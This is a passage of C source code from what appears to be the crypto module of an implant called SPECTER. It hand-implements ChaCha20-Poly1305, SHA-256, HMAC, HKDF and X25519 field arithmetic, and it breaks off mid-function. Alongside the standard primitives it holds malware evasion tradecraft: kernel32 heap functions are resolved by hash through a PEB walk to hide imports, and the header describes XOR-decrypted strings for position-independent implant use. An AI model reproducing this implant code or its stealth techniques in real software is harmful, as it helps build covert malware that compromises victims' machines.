/**
 * SPECTER Implant — Crypto Layer
 *
 * Inline implementations of all cryptographic primitives:
 *   - ChaCha20 stream cipher (RFC 8439)
 *   - Poly1305 MAC (RFC 8439)
 *   - ChaCha20-Poly1305 AEAD (RFC 8439)
 *   - SHA-256 (FIPS 180-4)
 *   - HMAC-SHA256 (RFC 2104)
 *   - HKDF-SHA256 (RFC 5869)
 *   - X25519 Diffie-Hellman (RFC 7748)
 *   - Compile-time string decryption (XOR-based)
 *
 * No external libraries. All resolved via PEB walk or inline math.
 */

#include "specter.h"
#include "crypto.h"
#include "peb.h"
#include "util.h"

static DWORD rotl32(DWORD v, int n) {
    return (v << n) | (v >> (32 - n));
}

/* ================================================================== */
/*  ChaCha20 Stream Cipher                                             */
/* ================================================================== */

#define QR(a, b, c, d)              \
    a += b; d ^= a; d = rotl32(d, 16); \
    c += d; b ^= c; b = rotl32(b, 12); \
    a += b; d ^= a; d = rotl32(d, 8);  \
    c += d; b ^= c; b = rotl32(b, 7);

void spec_chacha20_block(const DWORD state[16], BYTE output[64]) {
    DWORD x[16];
    int i;

    for (i = 0; i < 16; i++)
        x[i] = state[i];

    /* 20 rounds = 10 double-rounds */
    for (i = 0; i < 10; i++) {
        /* Column rounds */
        QR(x[0], x[4], x[8],  x[12])
        QR(x[1], x[5], x[9],  x[13])
        QR(x[2], x[6], x[10], x[14])
        QR(x[3], x[7], x[11], x[15])
        /* Diagonal rounds */
        QR(x[0], x[5], x[10], x[15])
        QR(x[1], x[6], x[11], x[12])
        QR(x[2], x[7], x[8],  x[13])
        QR(x[3], x[4], x[9],  x[14])
    }

    for (i = 0; i < 16; i++) {
        x[i] += state[i];
        store32_le(output + 4 * i, x[i]);
    }
}

void spec_chacha20_encrypt(const BYTE key[32], const BYTE nonce[12],
                           DWORD counter, const BYTE *plaintext,
                           DWORD len, BYTE *ciphertext) {
    DWORD state[16];
    BYTE block[64];
    DWORD i, j;

    /* "expand 32-byte k" */
    state[0]  = 0x61707865;
    state[1]  = 0x3320646e;
    state[2]  = 0x79622d32;
    state[3]  = 0x6b206574;

    /* Key */
    for (i = 0; i < 8; i++)
        state[4 + i] = load32_le(key + 4 * i);

    /* Counter */
    state[12] = counter;

    /* Nonce */
    state[13] = load32_le(nonce);
    state[14] = load32_le(nonce + 4);
    state[15] = load32_le(nonce + 8);

    for (i = 0; i < len; i += 64) {
        spec_chacha20_block(state, block);
        state[12]++; /* increment counter */

        DWORD chunk = len - i;
        if (chunk > 64) chunk = 64;

        for (j = 0; j < chunk; j++)
            ciphertext[i + j] = plaintext[i + j] ^ block[j];
    }

    /* Zeroize block */
    spec_memset(block, 0, sizeof(block));
    spec_memset(state, 0, sizeof(state));
}

/* ================================================================== */
/*  Poly1305 MAC — 130-bit arithmetic with 64-bit limbs                */
/* ================================================================== */

void spec_poly1305_auth(BYTE tag_out[16], const BYTE *msg, DWORD msg_len,
                        const BYTE key[32]) {
    /* Load r as 4 x 32-bit LE words and clamp per RFC 8439:
       bytes 3,7,11,15 top 4 bits cleared; bytes 4,8,12 bottom 2 bits cleared */
    DWORD t0 = load32_le(key + 0)  & 0x0FFFFFFF;
    DWORD t1 = load32_le(key + 4)  & 0x0FFFFFFC;
    DWORD t2 = load32_le(key + 8)  & 0x0FFFFFFC;
    DWORD t3 = load32_le(key + 12) & 0x0FFFFFFC;

    /* Split clamped r into 26-bit limbs */
    DWORD r[5];
    r[0] = t0 & 0x3FFFFFF;
    r[1] = ((t0 >> 26) | (t1 << 6)) & 0x3FFFFFF;
    r[2] = ((t1 >> 20) | (t2 << 12)) & 0x3FFFFFF;
    r[3] = ((t2 >> 14) | (t3 << 18)) & 0x3FFFFFF;
    r[4] = t3 >> 8;

    /* s = key[16..31] */
    DWORD s0 = load32_le(key + 16);
    DWORD s1 = load32_le(key + 20);
    DWORD s2 = load32_le(key + 24);
    DWORD s3 = load32_le(key + 28);

    /* Accumulator h = 0 */
    DWORD h[5] = {0, 0, 0, 0, 0};

    /* 5*r for reduction */
    DWORD sr[5];
    sr[1] = r[1] * 5;
    sr[2] = r[2] * 5;
    sr[3] = r[3] * 5;
    sr[4] = r[4] * 5;

    /* Process full 16-byte blocks */
    DWORD offset = 0;
    while (offset < msg_len) {
        DWORD remaining = msg_len - offset;
        BYTE block[17];
        DWORD blen = remaining < 16 ? remaining : 16;

        spec_memcpy(block, msg + offset, blen);
        block[blen] = 1; /* pad byte */
        spec_memset(block + blen + 1, 0, 16 - blen);

        /* Add block to h in 26-bit limbs */
        DWORD hibit = (blen < 16) ? 0 : (1 << 24);
        DWORD b0 = load32_le(block + 0);
        DWORD b1 = load32_le(block + 4);
        DWORD b2 = load32_le(block + 8);
        DWORD b3 = load32_le(block + 12);
        h[0] += b0 & 0x3FFFFFF;
        h[1] += ((b0 >> 26) | (b1 << 6)) & 0x3FFFFFF;
        h[2] += ((b1 >> 20) | (b2 << 12)) & 0x3FFFFFF;
        h[3] += ((b2 >> 14) | (b3 << 18)) & 0x3FFFFFF;
        h[4] += (b3 >> 8) | hibit;

        /* Multiply: h *= r (mod 2^130 - 5) */
        QWORD d0 = (QWORD)h[0]*r[0] + (QWORD)h[1]*sr[4] + (QWORD)h[2]*sr[3] + (QWORD)h[3]*sr[2] + (QWORD)h[4]*sr[1];
        QWORD d1 = (QWORD)h[0]*r[1] + (QWORD)h[1]*r[0]  + (QWORD)h[2]*sr[4] + (QWORD)h[3]*sr[3] + (QWORD)h[4]*sr[2];
        QWORD d2 = (QWORD)h[0]*r[2] + (QWORD)h[1]*r[1]  + (QWORD)h[2]*r[0]  + (QWORD)h[3]*sr[4] + (QWORD)h[4]*sr[3];
        QWORD d3 = (QWORD)h[0]*r[3] + (QWORD)h[1]*r[2]  + (QWORD)h[2]*r[1]  + (QWORD)h[3]*r[0]  + (QWORD)h[4]*sr[4];
        QWORD d4 = (QWORD)h[0]*r[4] + (QWORD)h[1]*r[3]  + (QWORD)h[2]*r[2]  + (QWORD)h[3]*r[1]  + (QWORD)h[4]*r[0];

        /* Carry propagation */
        DWORD c;
        c = (DWORD)(d0 >> 26); h[0] = (DWORD)d0 & 0x3FFFFFF; d1 += c;
        c = (DWORD)(d1 >> 26); h[1] = (DWORD)d1 & 0x3FFFFFF; d2 += c;
        c = (DWORD)(d2 >> 26); h[2] = (DWORD)d2 & 0x3FFFFFF; d3 += c;
        c = (DWORD)(d3 >> 26); h[3] = (DWORD)d3 & 0x3FFFFFF; d4 += c;
        c = (DWORD)(d4 >> 26); h[4] = (DWORD)d4 & 0x3FFFFFF; h[0] += c * 5;
        c = h[0] >> 26; h[0] &= 0x3FFFFFF; h[1] += c;

        offset += blen;
    }

    /* Final reduction: fully carry h */
    DWORD c;
    c = h[1] >> 26; h[1] &= 0x3FFFFFF; h[2] += c;
    c = h[2] >> 26; h[2] &= 0x3FFFFFF; h[3] += c;
    c = h[3] >> 26; h[3] &= 0x3FFFFFF; h[4] += c;
    c = h[4] >> 26; h[4] &= 0x3FFFFFF; h[0] += c * 5;
    c = h[0] >> 26; h[0] &= 0x3FFFFFF; h[1] += c;

    /* Compute h + -(2^130-5) = h - (2^130-5) */
    DWORD g[5];
    g[0] = h[0] + 5; c = g[0] >> 26; g[0] &= 0x3FFFFFF;
    g[1] = h[1] + c; c = g[1] >> 26; g[1] &= 0x3FFFFFF;
    g[2] = h[2] + c; c = g[2] >> 26; g[2] &= 0x3FFFFFF;
    g[3] = h[3] + c; c = g[3] >> 26; g[3] &= 0x3FFFFFF;
    g[4] = h[4] + c - (1 << 26);

    /* Select h or g based on carry (mask = all 1s if g[4] didn't underflow) */
    DWORD mask = (g[4] >> 31) - 1;  /* 0 if underflow, 0xFFFFFFFF if not */
    h[0] = (h[0] & ~mask) | (g[0] & mask);
    h[1] = (h[1] & ~mask) | (g[1] & mask);
    h[2] = (h[2] & ~mask) | (g[2] & mask);
    h[3] = (h[3] & ~mask) | (g[3] & mask);
    h[4] = (h[4] & ~mask) | (g[4] & mask);

    /* Assemble h from 26-bit limbs into two 64-bit halves */
    QWORD lo64 = (QWORD)h[0] | ((QWORD)h[1] << 26) | ((QWORD)h[2] << 52);
    QWORD hi64 = (h[2] >> 12) | ((QWORD)h[3] << 14) | ((QWORD)h[4] << 40);

    /* Add s (128-bit addition with carry propagation via 32-bit words) */
    QWORD f0 = (lo64 & 0xFFFFFFFF) + s0;
    QWORD f1 = (lo64 >> 32) + s1 + (f0 >> 32);
    QWORD f2 = (hi64 & 0xFFFFFFFF) + s2 + (f1 >> 32);
    QWORD f3 = (hi64 >> 32) + s3 + (f2 >> 32);

    store32_le(tag_out,      (DWORD)f0);
    store32_le(tag_out + 4,  (DWORD)f1);
    store32_le(tag_out + 8,  (DWORD)f2);
    store32_le(tag_out + 12, (DWORD)f3);
}

/* ================================================================== */
/*  ChaCha20-Poly1305 AEAD (RFC 8439)                                  */
/* ================================================================== */

/* ---- Heap helpers for large MAC buffers (PEB-resolved) ---- */

static PVOID crypto_heap_alloc(DWORD size) {
    typedef HANDLE (__attribute__((ms_abi)) *fn_gph)(void);
    typedef PVOID  (__attribute__((ms_abi)) *fn_ha)(HANDLE, DWORD, SIZE_T);
    PVOID k32 = find_module_by_hash(HASH_KERNEL32_DLL);
    if (!k32) return NULL;
    fn_gph pGPH = (fn_gph)find_export_by_hash(k32, 0xDA077562); /* GetProcessHeap */
    fn_ha  pHA  = (fn_ha) find_export_by_hash(k32, 0xB1CE974E); /* HeapAlloc      */
    if (!pGPH || !pHA) return NULL;
    HANDLE heap = pGPH();
    if (!heap) return NULL;
    return pHA(heap, 0x08, size); /* HEAP_ZERO_MEMORY */
}

static void crypto_heap_free(PVOID ptr) {
    if (!ptr) return;
    typedef HANDLE (__attribute__((ms_abi)) *fn_gph)(void);
    typedef BOOL   (__attribute__((ms_abi)) *fn_hf)(HANDLE, DWORD, PVOID);
    PVOID k32 = find_module_by_hash(HASH_KERNEL32_DLL);
    if (!k32) return;
    fn_gph pGPH = (fn_gph)find_export_by_hash(k32, 0xDA077562); /* GetProcessHeap */
    fn_hf  pHF  = (fn_hf) find_export_by_hash(k32, 0xBF94BC05); /* HeapFree       */
    if (!pGPH || !pHF) return;
    HANDLE heap = pGPH();
    if (heap) pHF(heap, 0, ptr);
}

static void pad16(BYTE *buf, DWORD *buf_len, DWORD data_len) {
    DWORD rem = data_len & 0xF;
    if (rem) {
        DWORD pad = 16 - rem;
        spec_memset(buf + *buf_len, 0, pad);
        *buf_len += pad;
    }
}

void spec_aead_encrypt(const BYTE key[32], const BYTE nonce[12],
                       const BYTE *plaintext, DWORD pt_len,
                       const BYTE *aad, DWORD aad_len,
                       BYTE *ciphertext, BYTE tag[16]) {
    /* Generate Poly1305 one-time key (first ChaCha20 block with counter=0) */
    BYTE poly_key[64];
    BYTE zero_pt[64];
    spec_memset(zero_pt, 0, 64);
    spec_chacha20_encrypt(key, nonce, 0, zero_pt, 64, poly_key);

    /* Encrypt plaintext with counter starting at 1 */
    spec_chacha20_encrypt(key, nonce, 1, plaintext, pt_len, ciphertext);

    /* Construct Poly1305 message: AAD ‖ pad ‖ ciphertext ‖ pad ‖ len(AAD) ‖ len(CT) */
    /* We compute Poly1305 incrementally using our block-based function.
       Build the MAC input in a temporary buffer on the stack. For PIC
       implant sizes, we process inline. */
    DWORD mac_len = 0;
    DWORD aad_padded = aad_len + ((16 - (aad_len & 0xF)) & 0xF);
    DWORD ct_padded = pt_len + ((16 - (pt_len & 0xF)) & 0xF);
    DWORD total_mac_len = aad_padded + ct_padded + 16;

    /* Stack buffer for small payloads; heap-allocate for large ones */
    BYTE mac_stack[4096];
    BYTE *mac_data = mac_stack;
    BOOL mac_heap = FALSE;

    if (total_mac_len > sizeof(mac_stack)) {
        BYTE *heap_buf = (BYTE *)crypto_heap_alloc(total_mac_len);
        if (heap_buf) {
            mac_data = heap_buf;
            mac_heap = TRUE;
        } else {
            /* Cannot compute MAC — fail explicitly */
            spec_memset(tag, 0, 16);
            spec_memset(poly_key, 0, sizeof(poly_key));
            return;
        }
    }

    mac_len = 0;
    /* AAD + padding */
    if (aad_len > 0)
        spec_memcpy(mac_data + mac_len, aad, aad_len);
    mac_len += aad_len;
    pad16(mac_data, &mac_len, aad_len);

    /* Ciphertext + padding */
    spec_memcpy(mac_data + mac_len, ciphertext, pt_len);
    mac_len += pt_len;
    pad16(mac_data, &mac_len, pt_len);

    /* Lengths as 64-bit LE */
    store64_le(mac_data + mac_len, (QWORD)aad_len);
    mac_len += 8;
    store64_le(mac_data + mac_len, (QWORD)pt_len);
    mac_len += 8;

    spec_poly1305_auth(tag, mac_data, mac_len, poly_key);

    spec_memset(poly_key, 0, sizeof(poly_key));
    spec_memset(mac_data, 0, mac_len);
    if (mac_heap) crypto_heap_free(mac_data);
}

BOOL spec_aead_decrypt(const BYTE key[32], const BYTE nonce[12],
                       const BYTE *ciphertext, DWORD ct_len,
                       const BYTE *aad, DWORD aad_len,
                       BYTE *plaintext, const BYTE tag[16]) {
    /* Generate Poly1305 one-time key */
    BYTE poly_key[64];
    BYTE zero_pt[64];
    spec_memset(zero_pt, 0, 64);
    spec_chacha20_encrypt(key, nonce, 0, zero_pt, 64, poly_key);

    /* Verify tag first */
    DWORD mac_len = 0;
    DWORD aad_padded = aad_len + ((16 - (aad_len & 0xF)) & 0xF);
    DWORD ct_padded = ct_len + ((16 - (ct_len & 0xF)) & 0xF);
    DWORD total_mac_len = aad_padded + ct_padded + 16;

    /* Stack buffer for small payloads; heap-allocate for large ones */
    BYTE mac_stack[4096];
    BYTE *mac_data = mac_stack;
    BOOL mac_heap = FALSE;

    if (total_mac_len > sizeof(mac_stack)) {
        BYTE *heap_buf = (BYTE *)crypto_heap_alloc(total_mac_len);
        if (heap_buf) {
            mac_data = heap_buf;
            mac_heap = TRUE;
        } else {
            spec_memset(poly_key, 0, sizeof(poly_key));
            return FALSE;
        }
    }

    mac_len = 0;
    if (aad_len > 0)
        spec_memcpy(mac_data + mac_len, aad, aad_len);
    mac_len += aad_len;
    pad16(mac_data, &mac_len, aad_len);

    spec_memcpy(mac_data + mac_len, ciphertext, ct_len);
    mac_len += ct_len;
    pad16(mac_data, &mac_len, ct_len);

    store64_le(mac_data + mac_len, (QWORD)aad_len);
    mac_len += 8;
    store64_le(mac_data + mac_len, (QWORD)ct_len);
    mac_len += 8;

    BYTE computed_tag[16];
    spec_poly1305_auth(computed_tag, mac_data, mac_len, poly_key);

    /* Constant-time comparison */
    BYTE diff = 0;
    for (int i = 0; i < 16; i++)
        diff |= computed_tag[i] ^ tag[i];

    spec_memset(poly_key, 0, sizeof(poly_key));
    spec_memset(mac_data, 0, mac_len);
    if (mac_heap) crypto_heap_free(mac_data);

    if (diff != 0) {
        spec_memset(computed_tag, 0, sizeof(computed_tag));
        return FALSE;
    }

    /* Decrypt */
    spec_chacha20_encrypt(key, nonce, 1, ciphertext, ct_len, plaintext);

    spec_memset(computed_tag, 0, sizeof(computed_tag));
    return TRUE;
}

/* ================================================================== */
/*  SHA-256 (FIPS 180-4)                                               */
/* ================================================================== */

static const DWORD sha256_k[64] = {
    0x428a2f98, 0x71374491, 0xb5c0fbcf, 0xe9b5dba5,
    0x3956c25b, 0x59f111f1, 0x923f82a4, 0xab1c5ed5,
    0xd807aa98, 0x12835b01, 0x243185be, 0x550c7dc3,
    0x72be5d74, 0x80deb1fe, 0x9bdc06a7, 0xc19bf174,
    0xe49b69c1, 0xefbe4786, 0x0fc19dc6, 0x240ca1cc,
    0x2de92c6f, 0x4a7484aa, 0x5cb0a9dc, 0x76f988da,
    0x983e5152, 0xa831c66d, 0xb00327c8, 0xbf597fc7,
    0xc6e00bf3, 0xd5a79147, 0x06ca6351, 0x14292967,
    0x27b70a85, 0x2e1b2138, 0x4d2c6dfc, 0x53380d13,
    0x650a7354, 0x766a0abb, 0x81c2c92e, 0x92722c85,
    0xa2bfe8a1, 0xa81a664b, 0xc24b8b70, 0xc76c51a3,
    0xd192e819, 0xd6990624, 0xf40e3585, 0x106aa070,
    0x19a4c116, 0x1e376c08, 0x2748774c, 0x34b0bcb5,
    0x391c0cb3, 0x4ed8aa4a, 0x5b9cca4f, 0x682e6ff3,
    0x748f82ee, 0x78a5636f, 0x84c87814, 0x8cc70208,
    0x90befffa, 0xa4506ceb, 0xbef9a3f7, 0xc67178f2
};

#define ROTR32(x, n) (((x) >> (n)) | ((x) << (32 - (n))))
#define SHR(x, n)    ((x) >> (n))

#define CH(x, y, z)  (((x) & (y)) ^ (~(x) & (z)))
#define MAJ(x, y, z) (((x) & (y)) ^ ((x) & (z)) ^ ((y) & (z)))
#define EP0(x)  (ROTR32(x, 2)  ^ ROTR32(x, 13) ^ ROTR32(x, 22))
#define EP1(x)  (ROTR32(x, 6)  ^ ROTR32(x, 11) ^ ROTR32(x, 25))
#define SIG0(x) (ROTR32(x, 7)  ^ ROTR32(x, 18) ^ SHR(x, 3))
#define SIG1(x) (ROTR32(x, 17) ^ ROTR32(x, 19) ^ SHR(x, 10))

static DWORD load32_be(const BYTE *p) {
    return ((DWORD)p[0] << 24) | ((DWORD)p[1] << 16) |
           ((DWORD)p[2] << 8)  | (DWORD)p[3];
}

static void store32_be(BYTE *p, DWORD v) {
    p[0] = (BYTE)(v >> 24);
    p[1] = (BYTE)(v >> 16);
    p[2] = (BYTE)(v >> 8);
    p[3] = (BYTE)(v);
}

static void sha256_transform(SHA256_CTX *ctx, const BYTE block[64]) {
    DWORD w[64];
    DWORD a, b, c, d, e, f, g, h;
    DWORD t1, t2;
    int i;

    for (i = 0; i < 16; i++)
        w[i] = load32_be(block + 4 * i);

    for (i = 16; i < 64; i++)
        w[i] = SIG1(w[i-2]) + w[i-7] + SIG0(w[i-15]) + w[i-16];

    a = ctx->state[0]; b = ctx->state[1];
    c = ctx->state[2]; d = ctx->state[3];
    e = ctx->state[4]; f = ctx->state[5];
    g = ctx->state[6]; h = ctx->state[7];

    for (i = 0; i < 64; i++) {
        t1 = h + EP1(e) + CH(e, f, g) + sha256_k[i] + w[i];
        t2 = EP0(a) + MAJ(a, b, c);
        h = g; g = f; f = e; e = d + t1;
        d = c; c = b; b = a; a = t1 + t2;
    }

    ctx->state[0] += a; ctx->state[1] += b;
    ctx->state[2] += c; ctx->state[3] += d;
    ctx->state[4] += e; ctx->state[5] += f;
    ctx->state[6] += g; ctx->state[7] += h;
}

void spec_sha256_init(SHA256_CTX *ctx) {
    ctx->state[0] = 0x6a09e667;
    ctx->state[1] = 0xbb67ae85;
    ctx->state[2] = 0x3c6ef372;
    ctx->state[3] = 0xa54ff53a;
    ctx->state[4] = 0x510e527f;
    ctx->state[5] = 0x9b05688c;
    ctx->state[6] = 0x1f83d9ab;
    ctx->state[7] = 0x5be0cd19;
    ctx->bitcount = 0;
    ctx->buf_len = 0;
}

void spec_sha256_update(SHA256_CTX *ctx, const BYTE *data, DWORD len) {
    DWORD i = 0;

    while (i < len) {
        ctx->buffer[ctx->buf_len++] = data[i++];
        if (ctx->buf_len == 64) {
            sha256_transform(ctx, ctx->buffer);
            ctx->bitcount += 512;
            ctx->buf_len = 0;
        }
    }
}

void spec_sha256_final(SHA256_CTX *ctx, BYTE digest[32]) {
    ctx->bitcount += (QWORD)ctx->buf_len * 8;

    /* Pad with 0x80 */
    ctx->buffer[ctx->buf_len++] = 0x80;

    if (ctx->buf_len > 56) {
        /* Need an extra block */
        while (ctx->buf_len < 64)
            ctx->buffer[ctx->buf_len++] = 0;
        sha256_transform(ctx, ctx->buffer);
        ctx->buf_len = 0;
    }

    while (ctx->buf_len < 56)
        ctx->buffer[ctx->buf_len++] = 0;

    /* Append length in bits as big-endian 64-bit */
    ctx->buffer[56] = (BYTE)(ctx->bitcount >> 56);
    ctx->buffer[57] = (BYTE)(ctx->bitcount >> 48);
    ctx->buffer[58] = (BYTE)(ctx->bitcount >> 40);
    ctx->buffer[59] = (BYTE)(ctx->bitcount >> 32);
    ctx->buffer[60] = (BYTE)(ctx->bitcount >> 24);
    ctx->buffer[61] = (BYTE)(ctx->bitcount >> 16);
    ctx->buffer[62] = (BYTE)(ctx->bitcount >> 8);
    ctx->buffer[63] = (BYTE)(ctx->bitcount);

    sha256_transform(ctx, ctx->buffer);

    for (int i = 0; i < 8; i++)
        store32_be(digest + 4 * i, ctx->state[i]);

    /* Zeroize */
    spec_memset(ctx, 0, sizeof(SHA256_CTX));
}

void spec_sha256(const BYTE *data, DWORD len, BYTE digest[32]) {
    SHA256_CTX ctx;
    spec_sha256_init(&ctx);
    spec_sha256_update(&ctx, data, len);
    spec_sha256_final(&ctx, digest);
}

/* ================================================================== */
/*  HMAC-SHA256                                                        */
/* ================================================================== */

void spec_hmac_sha256(const BYTE *key, DWORD key_len,
                      const BYTE *data, DWORD data_len,
                      BYTE mac[32]) {
    BYTE k_pad[SHA256_BLOCK_SIZE];
    BYTE i_pad[SHA256_BLOCK_SIZE];
    BYTE o_pad[SHA256_BLOCK_SIZE];
    BYTE key_hash[32];
    const BYTE *k;
    DWORD k_len;
    int i;

    if (key_len > SHA256_BLOCK_SIZE) {
        spec_sha256(key, key_len, key_hash);
        k = key_hash;
        k_len = 32;
    } else {
        k = key;
        k_len = key_len;
    }

    spec_memset(k_pad, 0, SHA256_BLOCK_SIZE);
    spec_memcpy(k_pad, k, k_len);

    for (i = 0; i < SHA256_BLOCK_SIZE; i++) {
        i_pad[i] = k_pad[i] ^ 0x36;
        o_pad[i] = k_pad[i] ^ 0x5C;
    }

    /* Inner hash: SHA256(i_pad ‖ data) */
    SHA256_CTX ctx;
    spec_sha256_init(&ctx);
    spec_sha256_update(&ctx, i_pad, SHA256_BLOCK_SIZE);
    spec_sha256_update(&ctx, data, data_len);
    BYTE inner[32];
    spec_sha256_final(&ctx, inner);

    /* Outer hash: SHA256(o_pad ‖ inner) */
    spec_sha256_init(&ctx);
    spec_sha256_update(&ctx, o_pad, SHA256_BLOCK_SIZE);
    spec_sha256_update(&ctx, inner, 32);
    spec_sha256_final(&ctx, mac);

    spec_memset(k_pad, 0, sizeof(k_pad));
    spec_memset(i_pad, 0, sizeof(i_pad));
    spec_memset(o_pad, 0, sizeof(o_pad));
    spec_memset(inner, 0, sizeof(inner));
}

/* ================================================================== */
/*  HKDF-SHA256 (RFC 5869)                                             */
/* ================================================================== */

void spec_hkdf_extract(const BYTE *salt, DWORD salt_len,
                       const BYTE *ikm, DWORD ikm_len,
                       BYTE prk[32]) {
    if (!salt || salt_len == 0) {
        BYTE zero_salt[32];
        spec_memset(zero_salt, 0, 32);
        spec_hmac_sha256(zero_salt, 32, ikm, ikm_len, prk);
    } else {
        spec_hmac_sha256(salt, salt_len, ikm, ikm_len, prk);
    }
}

void spec_hkdf_expand(const BYTE prk[32],
                      const BYTE *info, DWORD info_len,
                      BYTE *okm, DWORD okm_len) {
    BYTE t[32];
    DWORD t_len = 0;
    DWORD offset = 0;
    BYTE counter = 1;

    while (offset < okm_len) {
        /* HMAC-SHA256(PRK, T(i-1) ‖ info ‖ counter) */
        SHA256_CTX ctx;
        BYTE k_pad[SHA256_BLOCK_SIZE];
        BYTE i_pad[SHA256_BLOCK_SIZE];
        BYTE o_pad[SHA256_BLOCK_SIZE];

        spec_memset(k_pad, 0, SHA256_BLOCK_SIZE);
        spec_memcpy(k_pad, prk, 32);

        int i;
        for (i = 0; i < SHA256_BLOCK_SIZE; i++) {
            i_pad[i] = k_pad[i] ^ 0x36;
            o_pad[i] = k_pad[i] ^ 0x5C;
        }

        /* Inner: SHA256(i_pad ‖ T_prev ‖ info ‖ counter) */
        spec_sha256_init(&ctx);
        spec_sha256_update(&ctx, i_pad, SHA256_BLOCK_SIZE);
        if (t_len > 0)
            spec_sha256_update(&ctx, t, t_len);
        if (info_len > 0)
            spec_sha256_update(&ctx, info, info_len);
        spec_sha256_update(&ctx, &counter, 1);
        BYTE inner[32];
        spec_sha256_final(&ctx, inner);

        /* Outer: SHA256(o_pad ‖ inner) */
        spec_sha256_init(&ctx);
        spec_sha256_update(&ctx, o_pad, SHA256_BLOCK_SIZE);
        spec_sha256_update(&ctx, inner, 32);
        spec_sha256_final(&ctx, t);
        t_len = 32;

        DWORD copy_len = okm_len - offset;
        if (copy_len > 32) copy_len = 32;
        spec_memcpy(okm + offset, t, copy_len);
        offset += copy_len;
        counter++;
    }

    spec_memset(t, 0, sizeof(t));
}

void spec_hkdf_derive(const BYTE *salt, DWORD salt_len,
                      const BYTE *ikm, DWORD ikm_len,
                      const BYTE *info, DWORD info_len,
                      BYTE *okm, DWORD okm_len) {
    BYTE prk[32];
    spec_hkdf_extract(salt, salt_len, ikm, ikm_len, prk);
    spec_hkdf_expand(prk, info, info_len, okm, okm_len);
    spec_memset(prk, 0, sizeof(prk));
}

/* ================================================================== */
/*  X25519 Diffie-Hellman (RFC 7748)                                   */
/*  Field: GF(2^255 - 19), Montgomery ladder                          */
/* ================================================================== */

/*
 * Field element: 5 x 51-bit limbs stored in QWORD (unsigned long long).
 * Each limb holds up to ~52 bits before reduction is needed.
 * Type fe25519 is defined in crypto.h for sharing with crypto_sign.c.
 */

void fe_0(fe25519 h) {
    h[0] = h[1] = h[2] = h[3] = h[4] = 0;
}

void fe_1(fe25519 h) {
    h[0] = 1; h[1] = h[2] = h[3] = h[4] = 0;
}

void fe_copy(fe25519 h, const fe25519 f) {
    h[0] = f[0]; h[1] = f[1]; h[2] = f[2]; h[3] = f[3]; h[4] = f[4];
}

void fe_frombytes(fe25519 h, const BYTE s[32]) {
    QWORD h0 = load64_le(s);
    QWORD h1 = load64_le(s + 6) >> 3;
    QWORD h2 = load64_le(s + 12) >> 6;
    QWORD h3 = load64_le(s + 19) >> 1;
    QWORD h4 = load64_le(s + 24) >> 12;

    h[0] = h0 & 0x7FFFFFFFFFFFFULL;
    h[1] = h1 & 0x7FFFFFFFFFFFFULL;
    h[2] = h2 & 0x7FFFFFFFFFFFFULL;
    h[3] = h3 & 0x7FFFFFFFFFFFFULL;
    h[4] = h4 & 0x7FFFFFFFFFFFFULL;
}

void fe_tobytes(BYTE s[32], const fe25519 h) {
    /* Fully reduce mod 2^255-19 */
    QWORD t[5];
    t[0] = h[0]; t[1] = h[1]; t[2] = h[2]; t[3] = h[3]; t[4] = h[4];

    QWORD c;
    c = t[0] >> 51; t[0] &= 0x7FFFFFFFFFFFFULL; t[1] += c;
    c = t[1] >> 51; t[1] &= 0x7FFFFFFFFFFFFULL; t[2] += c;
    c = t[2] >> 51; t[2] &= 0x7FFFFFFFFFFFFULL; t[3] += c;
    c = t[3] >> 51; t[3] &= 0x7FFFFFFFFFFFFULL; t[4] += c;
    c = t[4] >> 51; t[4] &= 0x7FFFFFFFFFFFFULL; t[0] += c * 19;
    c = t[0] >> 51; t[0] &= 0x7FFFFFFFFFFFFULL; t[1] += c;

    /* Reduce again if needed */
    QWORD q = (t[0] + 19) >> 51;
    q = (t[1] + q) >> 51;
    q = (t[2] + q) >> 51;
    q = (t[3] + q) >> 51;
    q = (t[4] + q) >> 51;

    t[0] += 19 * q;
    c = t[0] >> 51; t[0] &= 0x7FFFFFFFFFFFFULL; t[1] += c;
    c = t[1] >> 51; t[1] &= 0x7FFFFFFFFFFFFULL; t[2] += c;
    c = t[2] >> 51; t[2] &= 0x7FFFFFFFFFFFFULL; t[3] += c;
    c = t[3] >> 51; t[3] &= 0x7FFFFFFFFFFFFULL; t[4] += c;
    t[4] &= 0x7FFFFFFFFFFFFULL;

    /* Pack into 32 bytes */
    spec_memset(s, 0, 32);
    s[0]  = (BYTE)(t[0]);
    s[1]  = (BYTE)(t[0] >> 8);
    s[2]  = (BYTE)(t[0] >> 16);
    s[3]  = (BYTE)(t[0] >> 24);
    s[4]  = (BYTE)(t[0] >> 32);
    s[5]  = (BYTE)(t[0] >> 40);
    s[6]  = (BYTE)((t[0] >> 48) | (t[1] << 3));
    s[7]  = (BYTE)(t[1] >> 5);
    s[8]  = (BYTE)(t[1] >> 13);
    s[9]  = (BYTE)(t[1] >> 21);
    s[10] = (BYTE)(t[1] >> 29);
    s[11] = (BYTE)(t[1] >> 37);
    s[12] = (BYTE)((t[1] >> 45) | (t[2] << 6));
    s[13] = (BYTE)(t[2] >> 2);
    s[14] = (BYTE)(t[2] >> 10);
    s[15] = (BYTE)(t[2] >> 18);
    s[16] = (BYTE)(t[2] >> 26);
    s[17] = (BYTE)(t[2] >> 34);
    s[18] = (BYTE)(t[2] >> 42);
    s[19] = (BYTE)((t[2] >> 50) | (t[3] << 1));
    s[20] = (BYTE)(t[3] >> 7);
    s[21] = (BYTE)(t[3] >> 15);
    s[22] = (BYTE)(t[3] >> 23);
    s[23] = (BYTE)(t[3] >> 31);
    s[24] = (BYTE)(t[3] >> 39);
    s[25] = (BYTE)((t[3] >> 47) | (t[4] << 4));
    s[26] = (BYTE)(t[4] >> 4);
    s[27] = (BYTE)(t[4] >> 12);
    s[28] = (BYTE)(t[4] >> 20);
    s[29] = (BYTE)(t[4] >> 28);
    s[30] = (BYTE)(t[4] >> 36);
    s[31] = (BYTE)(t[4] >> 44);
}

void fe_add(fe25519 h, const fe25519 f, const fe25519 g) {
    h[0] = f[0] + g[0];
    h[1] = f[1] + g[1];
    h[2] = f[2] + g[2];
    h[3] = f[3] + g[3];
    h[4] = f[4] + g[4];
}

void fe_sub(fe25519 h, const fe25519 f, const fe25519 g) {
    /* Add 2*p to avoid underflow:
       2p = 2*(2^255-19) which in limbs is (2*0x7FFFFFFFFFFFF - 2*19, 2*mask, ...) */
    h[0] = f[0] + 0xFFFFFFFFFFFDAULL - g[0];
    h[1] = f[1] + 0xFFFFFFFFFFFFEULL - g[1];
    h[2] = f[2] + 0xFFFFFFFFFFFFEULL - g[2];
    h[3] = f[3] + 0xFFFFFFFFFFFFEULL - g[3];
